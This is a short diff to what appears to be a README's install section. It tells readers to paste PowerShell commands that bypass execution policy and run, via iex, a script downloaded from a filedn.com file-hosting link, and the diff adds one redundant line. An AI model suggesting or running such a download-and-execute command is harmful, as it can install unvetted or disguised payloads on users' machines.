@@ -19,6 +19,7 @@ Copy then right click to paste all below commands into PowerShell window at once
 
 ```bash
 $url="https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Files/7/install.ps1"
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
 Set-ExecutionPolicy Bypass -Scope Process -Force
 iex ((New-Object System.Net.WebClient).DownloadString($url))
 ```
